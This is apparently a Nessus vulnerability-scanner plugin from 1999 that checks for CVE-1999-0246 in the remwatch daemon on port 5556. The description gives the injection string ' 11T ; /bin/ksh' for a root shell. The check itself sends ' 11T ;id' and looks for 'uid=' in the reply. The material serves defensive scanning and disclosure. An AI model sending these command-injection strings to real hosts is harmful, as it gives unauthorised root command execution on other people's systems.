#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10202);
script_cve_id("CVE-1999-0246");
 script_version ("$Revision: 1.12 $");
 name["english"] = "remwatch";
 name["francais"] = "remwatch";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
remwatch is installed and allows anyone to execute
arbitrary commands.

An attacker may issue shell commands as root by
connecting to the remwatch daemon, and issue
the command : ' 11T ; /bin/ksh'.

Solution : deactivate the remwatch service. 
Contact your vendor for a patch.

Risk factor : High";
 
desc["francais"] = "
remwatch est installé et permet d'executer des commandes
arbitraires.

Un pirate peut executer des commandes shell en tant que
root en se connectant au serveur remwatch, et en envoyant
la commande : ' 11T ;/bin/ksh'.

Solution : désactivez ce service et contactez votre vendeur
pour un patch.

Facteur de risque : Elevé";

 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "Executes 'id' thanks to remwatch";
 summary["francais"] = "Execute 'id' grace à remwatch";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);

 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 
 script_family(english:family["english"],
 	       francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports(5556);
 exit(0);
}

#
# The script code starts here
#

port = 5556;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
 s = string(" 11T ;id\n");
 send(socket:soc, data:s);
 b = recv(socket:soc, length:1024);
 if("uid=" >< b)security_hole(port);
 close(soc);
}
